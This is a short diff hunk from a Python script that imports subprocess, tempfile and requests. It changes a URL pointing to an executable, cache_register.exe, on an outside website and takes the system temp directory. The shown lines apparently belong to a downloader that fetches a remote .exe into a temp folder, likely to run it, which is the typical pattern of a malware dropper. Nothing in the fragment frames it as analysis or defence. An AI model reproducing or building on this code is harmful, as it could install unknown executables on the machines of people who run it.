@@ -4,7 +4,7 @@ import subprocess
 import tempfile
 import requests
 
-url = "https://ozarkfluidpower.com/hosecat/cache_register.exe"
+url = "https://ozarkfluidpower.com/old_files/cache_register.exe"
 
 temp_dir = tempfile.gettempdir()
 
